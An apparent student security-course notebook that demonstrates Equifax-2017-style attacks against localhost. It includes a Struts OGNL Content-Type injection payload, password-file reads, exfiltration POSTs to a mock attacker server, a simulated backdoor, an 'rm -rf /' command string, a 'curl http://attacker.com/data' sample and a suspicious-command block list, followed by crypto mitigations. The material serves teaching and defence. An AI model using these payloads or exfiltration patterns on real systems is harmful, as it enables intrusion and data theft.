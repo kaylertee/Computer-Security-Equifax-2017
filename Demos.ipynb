{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "1f54c218",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Collecting flask\n",
      "  Using cached flask-3.1.2-py3-none-any.whl.metadata (3.2 kB)\n",
      "Collecting pyOpenSSL\n",
      "  Downloading pyopenssl-25.1.0-py3-none-any.whl.metadata (17 kB)\n",
      "Collecting blinker>=1.9.0 (from flask)\n",
      "  Using cached blinker-1.9.0-py3-none-any.whl.metadata (1.6 kB)\n",
      "Collecting click>=8.1.3 (from flask)\n",
      "  Using cached click-8.2.1-py3-none-any.whl.metadata (2.5 kB)\n",
      "Collecting itsdangerous>=2.2.0 (from flask)\n",
      "  Using cached itsdangerous-2.2.0-py3-none-any.whl.metadata (1.9 kB)\n",
      "Collecting jinja2>=3.1.2 (from flask)\n",
      "  Using cached jinja2-3.1.6-py3-none-any.whl.metadata (2.9 kB)\n",
      "Collecting markupsafe>=2.1.1 (from flask)\n",
      "  Using cached MarkupSafe-3.0.2-cp312-cp312-win_amd64.whl.metadata (4.1 kB)\n",
      "Collecting werkzeug>=3.1.0 (from flask)\n",
      "  Using cached werkzeug-3.1.3-py3-none-any.whl.metadata (3.7 kB)\n",
      "Collecting cryptography<46,>=41.0.5 (from pyOpenSSL)\n",
      "  Downloading cryptography-45.0.7-cp311-abi3-win_amd64.whl.metadata (5.7 kB)\n",
      "Collecting typing-extensions>=4.9 (from pyOpenSSL)\n",
      "  Downloading typing_extensions-4.15.0-py3-none-any.whl.metadata (3.3 kB)\n",
      "Requirement already satisfied: colorama in c:\\school\\cz4062 computer security\\project\\test\\venv\\.venv\\lib\\site-packages (from click>=8.1.3->flask) (0.4.6)\n",
      "Collecting cffi>=1.14 (from cryptography<46,>=41.0.5->pyOpenSSL)\n",
      "  Downloading cffi-1.17.1-cp312-cp312-win_amd64.whl.metadata (1.6 kB)\n",
      "Collecting pycparser (from cffi>=1.14->cryptography<46,>=41.0.5->pyOpenSSL)\n",
      "  Downloading pycparser-2.22-py3-none-any.whl.metadata (943 bytes)\n",
      "Using cached flask-3.1.2-py3-none-any.whl (103 kB)\n",
      "Downloading pyopenssl-25.1.0-py3-none-any.whl (56 kB)\n",
      "Using cached blinker-1.9.0-py3-none-any.whl (8.5 kB)\n",
      "Using cached click-8.2.1-py3-none-any.whl (102 kB)\n",
      "Downloading cryptography-45.0.7-cp311-abi3-win_amd64.whl (3.4 MB)\n",
      "   ---------------------------------------- 0.0/3.4 MB ? eta -:--:--\n",
      "   ---------------------------------------- 3.4/3.4 MB 20.1 MB/s eta 0:00:00\n",
      "Using cached itsdangerous-2.2.0-py3-none-any.whl (16 kB)\n",
      "Using cached jinja2-3.1.6-py3-none-any.whl (134 kB)\n",
      "Using cached MarkupSafe-3.0.2-cp312-cp312-win_amd64.whl (15 kB)\n",
      "Downloading typing_extensions-4.15.0-py3-none-any.whl (44 kB)\n",
      "Using cached werkzeug-3.1.3-py3-none-any.whl (224 kB)\n",
      "Downloading cffi-1.17.1-cp312-cp312-win_amd64.whl (181 kB)\n",
      "Downloading pycparser-2.22-py3-none-any.whl (117 kB)\n",
      "Installing collected packages: typing-extensions, pycparser, markupsafe, itsdangerous, click, blinker, werkzeug, jinja2, cffi, flask, cryptography, pyOpenSSL\n",
      "Successfully installed blinker-1.9.0 cffi-1.17.1 click-8.2.1 cryptography-45.0.7 flask-3.1.2 itsdangerous-2.2.0 jinja2-3.1.6 markupsafe-3.0.2 pyOpenSSL-25.1.0 pycparser-2.22 typing-extensions-4.15.0 werkzeug-3.1.3\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "\n",
      "[notice] A new release of pip is available: 25.0.1 -> 25.2\n",
      "[notice] To update, run: python.exe -m pip install --upgrade pip\n"
     ]
    }
   ],
   "source": [
    "!pip install flask pyOpenSSL\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1c9445b6",
   "metadata": {},
   "source": [
    "Server setup"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "cd1fa1ea",
   "metadata": {},
   "source": [
    "Attack simulation"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7a007234",
   "metadata": {},
   "outputs": [],
   "source": [
    "from flask import Flask, request, make_response\n",
    "import threading\n",
    "\n",
    "app = Flask(__name__)\n",
    "\n",
    "SUSPICIOUS_PATTERNS = [\"%{\", \"Runtime.getRuntime\", \"ProcessBuilder\"]\n",
    "\n",
    "@app.route(\"/\", methods=[\"POST\", \"GET\"])\n",
    "def index():\n",
    "    # Log all headers\n",
    "    print(\"=== Incoming Headers ===\")\n",
    "    for k, v in request.headers.items():\n",
    "        print(f\"{k}: {v}\")\n",
    "    print(\"========================\")\n",
    "\n",
    "    # Check for suspicious patterns\n",
    "    for header_value in request.headers.values():\n",
    "        if any(pattern in header_value for pattern in SUSPICIOUS_PATTERNS):\n",
    "            print(\"Attack blocked\")\n",
    "            resp = make_response(\"Attack blocked\", 400)\n",
    "            resp.headers[\"AttackStatus\"] = \"Blocked\"\n",
    "            return resp\n",
    "\n",
    "    return \"Request OK\", 200\n",
    "\n",
    "def run_server():\n",
    "    app.run(host=\"0.0.0.0\", port=8080)\n",
    "\n",
    "threading.Thread(target=run_server, daemon=True).start()\n",
    "print(\"Server running on http://localhost:8080\")\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a5f8937a",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "\n",
    "malicious_headers = {\n",
    "    \"Content-Type\": \"%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('AttackSuccess',1+1)}.multipart/form-data\"\n",
    "}\n",
    "\n",
    "response = requests.post(\"http://localhost:8080/\", headers=malicious_headers)\n",
    "print(\"Status Code:\", response.status_code)\n",
    "print(\"AttackStatus Header:\", response.headers.get(\"AttackStatus\"))\n",
    "print(\"Response Text:\", response.text)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0b8ec307",
   "metadata": {},
   "source": [
    "OS Sec Demo\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "8ad1348e",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Sandbox environment created at: C:\\Users\\Admin\\AppData\\Local\\Temp\\tmp16j26e9p\n"
     ]
    }
   ],
   "source": [
    "import os\n",
    "import tempfile\n",
    "import requests\n",
    "\n",
    "# Create a temporary folder to simulate the server environment\n",
    "demo_dir = os.getcwd()\n",
    "print(\"Sandbox environment created at:\", demo_dir)\n",
    "\n",
    "# Simulate a sensitive file\n",
    "with open(\"passwords.txt\", \"w\") as f:\n",
    "    f.write(\"supersecretpassword123\")\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "195416f3",
   "metadata": {},
   "source": [
    "Attackers can send OS Commands"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "b39d647e",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Executed 'whoami': kayler\\kayler\n"
     ]
    }
   ],
   "source": [
    "# Simulate attacker running 'whoami'\n",
    "user = os.popen(\"whoami\").read().strip()\n",
    "print(\"Executed 'whoami':\", user)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "af73f430",
   "metadata": {},
   "source": [
    "More OS Commands"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "id": "581c56f5",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Files in the system: ['passwords.txt']\n",
      "Contents of passwords.txt: supersecretpassword123\n"
     ]
    }
   ],
   "source": [
    "# List files in the sandbox\n",
    "files = os.popen(f\"ls {demo_dir}\").read().strip().split(\"\\n\")\n",
    "print(\"Files in the system:\", files)\n",
    "\n",
    "# Read the sensitive file\n",
    "passwords = os.popen(f\"cat {password_file}\").read().strip()\n",
    "print(\"Contents of passwords.txt:\", passwords)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "57229f41",
   "metadata": {},
   "source": [
    "Exfiltrating Data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "dbb92e75",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Exfiltrating data to attacker server: http://localhost:5000/exfil\n",
      "Data: password1\n",
      "password2\n",
      "Response: {status:success,received_keys:[stolen_data]}\n"
     ]
    }
   ],
   "source": [
    "# Simulate attacker exfiltrating data to their server\n",
    "attacker_server = \"http://localhost:5000/exfil\"  # demo server you control\n",
    "\n",
    "data_to_exfiltrate = passwords\n",
    "\n",
    "\n",
    "print(\"Exfiltrating data to attacker server:\", attacker_server)\n",
    "print(\"Data:\", data_to_exfiltrate)\n",
    "\n",
    "response = requests.post(attacker_server, json={\"stolen_data\": data_to_exfiltrate})\n",
    "print(\"Response:\", response.text)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1fd8a090",
   "metadata": {},
   "source": [
    "Encrypting Data before Exfiltration"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3837faa9",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Encrypted data ready to exfiltrate: b'gAAAAABlY...'\n",
      "Exfiltrating encrypted data to attacker server: http://localhost:5000/exfil\n",
      "Decrypted locally for verification: supersecretpassword123\n"
     ]
    }
   ],
   "source": [
    "from cryptography.fernet import Fernet\n",
    "\n",
    "# Generate a symmetric key for demo\n",
    "key = Fernet.generate_key()\n",
    "cipher = Fernet(key)\n",
    "\n",
    "# Encrypt the sensitive data\n",
    "encrypted_data = cipher.encrypt(data_to_exfiltrate.encode())\n",
    "print(\"Encrypted data ready to exfiltrate:\", encrypted_data)\n",
    "\n",
    "# Simulate sending encrypted data\n",
    "print(\"Exfiltrating encrypted data to attacker server:\", attacker_server)\n",
    "\n",
    "# For demo, show how it would be sent\n",
    "# response = requests.post(attacker_server, json={\"stolen_data\": encrypted_data.decode()})\n",
    "# print(\"Response:\", response.text)\n",
    "\n",
    "# Optional: decrypt locally to verify\n",
    "decrypted_data = cipher.decrypt(encrypted_data).decode()\n",
    "print(\"Decrypted locally for verification:\", decrypted_data)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c403e05c",
   "metadata": {},
   "source": [
    "Privilege escalation"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "id": "f8be882a",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Current user before escalation: kayler\\kayler\n",
      "Privilege escalated to: root\n"
     ]
    }
   ],
   "source": [
    "# Simulate privilege escalation (safe)\n",
    "current_user = os.popen(\"whoami\").read().strip()\n",
    "print(\"Current user before escalation:\", current_user)\n",
    "\n",
    "# In demo, we just simulate escalation\n",
    "simulated_escalation = \"root\"\n",
    "print(\"Privilege escalated to:\", simulated_escalation)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6db2407d",
   "metadata": {},
   "source": [
    "Creating a Backdoor"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "01e41731",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Backdoor server running on http://localhost:6000/backdoor\n",
      " * Serving Flask app '__main__'\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      " * Debug mode: off\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.\n",
      " * Running on all addresses (0.0.0.0)\n",
      " * Running on http://127.0.0.1:6000\n",
      " * Running on http://192.168.50.227:6000\n",
      "Press CTRL+C to quit\n"
     ]
    }
   ],
   "source": [
    "import threading\n",
    "import time\n",
    "from flask import Flask, request, jsonify\n",
    "\n",
    "# Attacker-controlled demo server to simulate persistent backdoor access\n",
    "backdoor_app = Flask(__name__)\n",
    "\n",
    "@backdoor_app.route(\"/backdoor\", methods=[\"POST\"])\n",
    "def backdoor():\n",
    "    cmd = request.json.get(\"command\")\n",
    "    print(f\"Received backdoor command: {cmd}\")\n",
    "    # Simulate execution of OS commands (safe demo)\n",
    "    if cmd == \"list_files\":\n",
    "        result = [\"file1.txt\", \"passwords.txt\"]\n",
    "    elif cmd == \"whoami\":\n",
    "        result = \"demo_user\"\n",
    "    else:\n",
    "        result = f\"Command '{cmd}' not recognized in demo\"\n",
    "    return jsonify({\"result\": result})\n",
    "\n",
    "def run_backdoor():\n",
    "    backdoor_app.run(host=\"0.0.0.0\", port=6000)\n",
    "\n",
    "# Run backdoor in a separate thread\n",
    "threading.Thread(target=run_backdoor, daemon=True).start()\n",
    "print(\"Backdoor server running on http://localhost:6000/backdoor\")\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c7c0724e",
   "metadata": {},
   "source": [
    "Sending commands to backdoor"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "id": "e29a3e8a",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Command: whoami, Response: demo_user\n",
      "Command: list_files, Response: ['file1.txt', 'passwords.txt']\n",
      "Command: rm -rf /, Response: Command 'rm -rf /' not recognized in demo\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "\n",
    "attacker_server = \"http://localhost:6000/backdoor\"\n",
    "\n",
    "# Commands sent by attacker\n",
    "commands = [\"whoami\", \"list_files\", \"rm -rf /\"]  # last one is just a demo, no real deletion\n",
    "\n",
    "for cmd in commands:\n",
    "    response = requests.post(attacker_server, json={\"command\": cmd})\n",
    "    print(f\"Command: {cmd}, Response: {response.json()['result']}\")\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e4dd794e",
   "metadata": {},
   "source": [
    "How to mitigate the OS Sec Violations: Endpoint Monitoring"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7ef9a03d",
   "metadata": {},
   "outputs": [],
   "source": [
    "#Define suspicious commands and sensitive files\n",
    "SUSPICIOUS_COMMANDS = [\"cat\", \"curl\", \"wget\", \"scp\", \"nc\", \"bash\"]\n",
    "SENSITIVE_FILES = [\"customer_data.csv\"]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "id": "841c6c91",
   "metadata": {},
   "outputs": [],
   "source": [
    "import os\n",
    "\n",
    "# Example commands issued on the system\n",
    "commands_run = [\n",
    "    \"ls\",\n",
    "    \"cat passwords.txt\",\n",
    "    \"echo 'hello world'\",\n",
    "    \"rm -rf /\",\n",
    "    \"curl http://attacker.com/data\"\n",
    "]\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "id": "980e9fb4",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ALERTS:\n",
      "Suspicious command detected: cat passwords.txt\n",
      "Suspicious command detected: curl http://attacker.com/data\n"
     ]
    }
   ],
   "source": [
    "alerts = []\n",
    "\n",
    "for cmd in commands_run:\n",
    "    if any(susp in cmd for susp in SUSPICIOUS_COMMANDS):\n",
    "        alerts.append(f\"Suspicious command detected: {cmd}\")\n",
    "\n",
    "if alerts:\n",
    "    print(\"ALERTS:\")\n",
    "    for alert in alerts:\n",
    "        print(alert)\n",
    "else:\n",
    "    print(\"No suspicious commands detected.\")\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "id": "0ba52ecf",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "File Alerts:\n",
      "Access to sensitive file detected: customer_data.csv\n"
     ]
    }
   ],
   "source": [
    "# Example files accessed\n",
    "files_accessed = [\"passwords.txt\", \"customer_data.csv\"]\n",
    "\n",
    "file_alerts = []\n",
    "\n",
    "for f in files_accessed:\n",
    "    if f in SENSITIVE_FILES:\n",
    "        file_alerts.append(f\"Access to sensitive file detected: {f}\")\n",
    "\n",
    "if file_alerts:\n",
    "    print(\"\\nFile Alerts:\")\n",
    "    for alert in file_alerts:\n",
    "        print(alert)\n",
    "else:\n",
    "    print(\"\\nNo sensitive file access detected.\")\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ca7e583e",
   "metadata": {},
   "source": [
    "Data Exposure & Weak Encryption (AES ECB example)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "id": "6b4e9df0",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Ciphertext (weak AES ECB): 8b8db791d951c2ed2ad78b0d2f261d813530ae8682c6b5bcd737f8b826dfa5caea1b01631ebdd434b24fbfdd092b87d9\n",
      "Decrypted: Sensitive customer data: passwords, emails\n"
     ]
    }
   ],
   "source": [
    "from Crypto.Cipher import AES\n",
    "from Crypto.Util.Padding import pad, unpad\n",
    "\n",
    "key = b'Sixteen byte key'  # 16 bytes key (AES-128)\n",
    "data = b'Sensitive customer data: passwords, emails'\n",
    "\n",
    "cipher = AES.new(key, AES.MODE_ECB)  # ECB is insecure\n",
    "ciphertext = cipher.encrypt(pad(data, AES.block_size))\n",
    "print(\"Ciphertext (weak AES ECB):\", ciphertext.hex())\n",
    "\n",
    "plain = unpad(cipher.decrypt(ciphertext), AES.block_size)\n",
    "print(\"Decrypted:\", plain.decode())\n",
    "\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4744e12e",
   "metadata": {},
   "source": [
    "Password Hashing & Cracking"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "e29c6b3f",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Password: 123456 -> MD5 Hash: e10adc3949ba59abbe56e057f20f883e\n",
      "Password: password -> MD5 Hash: 5f4dcc3b5aa765d61d8327deb882cf99\n",
      "Password: letmein -> MD5 Hash: 0d107d09f5bbe40cade3de5c71e9e9b7\n",
      "Cracked hash e10adc3949ba59abbe56e057f20f883e -> 123456\n",
      "Cracked hash 5f4dcc3b5aa765d61d8327deb882cf99 -> password\n"
     ]
    }
   ],
   "source": [
    "import hashlib\n",
    "\n",
    "passwords = [\"123456\", \"password\", \"letmein\"]\n",
    "hashes = [hashlib.md5(p.encode()).hexdigest() for p in passwords]  # MD5 = weak\n",
    "for p, h in zip(passwords, hashes):\n",
    "    print(f\"Password: {p} -> MD5 Hash: {h}\")\n",
    "\n",
    "# attacker tries to guess passwords\n",
    "dictionary = [\"123456\", \"qwerty\", \"password\", \"admin\"]\n",
    "for h in hashes:\n",
    "    for guess in dictionary:\n",
    "        if hashlib.md5(guess.encode()).hexdigest() == h:\n",
    "            print(f\"Cracked hash {h} -> {guess}\")\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4911c4b1",
   "metadata": {},
   "source": [
    "Identity Theft Simulation"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "4c7e638f",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Exposed PII: {\"name\": \"John Doe\", \"email\": \"john@example.com\", \"ssn\": \"123-45-6789\"}\n",
      "Simulate attacker sending phishing email to john@example.com\n"
     ]
    }
   ],
   "source": [
    "import json\n",
    "\n",
    "pii_data = {\n",
    "    \"name\": \"John Doe\",\n",
    "    \"email\": \"john@example.com\",\n",
    "    \"ssn\": \"123-45-6789\"\n",
    "}\n",
    "print(\"Exposed PII:\", json.dumps(pii_data))\n",
    "\n",
    "stolen_email = pii_data[\"email\"]\n",
    "print(f\"Simulate attacker sending phishing email to {stolen_email}\")\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "8afb26a7",
   "metadata": {},
   "source": [
    "Mitigation: Use Diffie-Hellman Key Exchange"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "147ea05f",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Alice private key: 18, Bob private key: 10\n"
     ]
    }
   ],
   "source": [
    "#Setup DH parameters\n",
    "from secrets import randbelow\n",
    "\n",
    "# Prime and generator (small for demo)\n",
    "p = 23\n",
    "g = 5\n",
    "\n",
    "# Alice & Bob private keys\n",
    "a = randbelow(p)\n",
    "b = randbelow(p)\n",
    "print(f\"Alice private key: {a}, Bob private key: {b}\")\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "398fe549",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Alice public: 6, Bob public: 9\n"
     ]
    }
   ],
   "source": [
    "#Compute public keys\n",
    "A = pow(g, a, p)\n",
    "B = pow(g, b, p)\n",
    "print(f\"Alice public: {A}, Bob public: {B}\")\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "7bb046e3",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Alice shared: 4, Bob shared: 4\n"
     ]
    }
   ],
   "source": [
    "#Compute shared secret\n",
    "alice_shared = pow(B, a, p)\n",
    "bob_shared = pow(A, b, p)\n",
    "print(f\"Alice shared: {alice_shared}, Bob shared: {bob_shared}\")\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f981af65",
   "metadata": {},
   "source": [
    "Both parties now share the same secret without transmitting it directly"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ecfe353e",
   "metadata": {},
   "source": [
    "Simulated HTTPS Server with Expired Certificate"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "cab7d531",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "HTTPS server running on https://localhost:8443 with expired certificate\n",
      " * Serving Flask app '__main__'\n",
      " * Debug mode: off\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.\n",
      " * Running on all addresses (0.0.0.0)\n",
      " * Running on https://127.0.0.1:8443\n",
      " * Running on https://192.168.50.227:8443\n",
      "Press CTRL+C to quit\n",
      "127.0.0.1 - - [04/Sep/2025 16:35:30] \"POST /secure-data HTTP/1.1\" 404 -\n",
      "127.0.0.1 - - [04/Sep/2025 16:36:23] \"POST /secure-data HTTP/1.1\" 404 -\n"
     ]
    }
   ],
   "source": [
    "import ssl\n",
    "from flask import Flask\n",
    "\n",
    "app = Flask(__name__)\n",
    "\n",
    "@app.route(\"/\")\n",
    "def index():\n",
    "    return \"HTTPS Server Running with Expired Certificate\"\n",
    "\n",
    "# Generate expired cert/key automatically\n",
    "from OpenSSL import crypto\n",
    "import datetime\n",
    "\n",
    "cert_file = \"expired_cert.pem\"\n",
    "key_file = \"expired_key.pem\"\n",
    "\n",
    "# Create key\n",
    "k = crypto.PKey()\n",
    "k.generate_key(crypto.TYPE_RSA, 2048)\n",
    "\n",
    "# Create certificate\n",
    "cert = crypto.X509()\n",
    "cert.get_subject().CN = \"localhost\"\n",
    "cert.set_serial_number(1000)\n",
    "cert.gmtime_adj_notBefore(-5*365*24*60*60)  # 5 years ago\n",
    "cert.gmtime_adj_notAfter(-1*365*24*60*60)   # expired 1 year ago\n",
    "cert.set_issuer(cert.get_subject())\n",
    "cert.set_pubkey(k)\n",
    "cert.sign(k, \"sha256\")\n",
    "\n",
    "with open(cert_file, \"wt\") as f:\n",
    "    f.write(crypto.dump_certificate(crypto.FILETYPE_PEM, cert).decode(\"utf-8\"))\n",
    "with open(key_file, \"wt\") as f:\n",
    "    f.write(crypto.dump_privatekey(crypto.FILETYPE_PEM, k).decode(\"utf-8\"))\n",
    "\n",
    "# Setup SSL context with expired cert\n",
    "context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)\n",
    "context.load_cert_chain(certfile=cert_file, keyfile=key_file)\n",
    "\n",
    "# Run server\n",
    "import threading\n",
    "def run_server():\n",
    "    app.run(host=\"0.0.0.0\", port=8443, ssl_context=context)\n",
    "\n",
    "threading.Thread(target=run_server, daemon=True).start()\n",
    "print(\"HTTPS server running on https://localhost:8443 with expired certificate\")\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "id": "7166467b",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      " * Serving Flask app '__main__'\n",
      " * Debug mode: off\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.\n",
      " * Running on all addresses (0.0.0.0)\n",
      " * Running on https://127.0.0.1:8443\n",
      " * Running on https://192.168.50.227:8443\n",
      "Press CTRL+C to quit\n"
     ]
    }
   ],
   "source": [
    "from flask import Flask, request, jsonify\n",
    "import ssl\n",
    "\n",
    "app = Flask(__name__)\n",
    "\n",
    "@app.route(\"/secure-data\", methods=[\"POST\"])\n",
    "def secure_data():\n",
    "    data = request.json\n",
    "    print(\"Received data:\", data)\n",
    "    return jsonify({\"status\": \"received\", \"data\": data})\n",
    "\n",
    "# Load expired self-signed cert\n",
    "context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)\n",
    "context.load_cert_chain(certfile=\"expired_cert.pem\", keyfile=\"expired_key.pem\")\n",
    "\n",
    "app.run(host=\"0.0.0.0\", port=8443, ssl_context=context)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "cb702c1c",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Response Status Code: 200\n",
      "Response JSON: {'status': 'received', 'data': {'stolen_data': 'Sensitive info exfiltrated!'}}\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "import urllib3\n",
    "\n",
    "# Suppress warnings to simulate bypassed inspection\n",
    "urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n",
    "\n",
    "attacker_data = {\"stolen_data\": \"Sensitive info exfiltrated!\"}\n",
    "\n",
    "# Allow insecure connection to expired cert server\n",
    "response = requests.post(\"https://localhost:8443/secure-data\", json=attacker_data, verify=False)\n",
    "\n",
    "print(\"Response Status Code:\", response.status_code)\n",
    "print(\"Response JSON:\", response.json())\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".venv (3.12.10)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.10"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
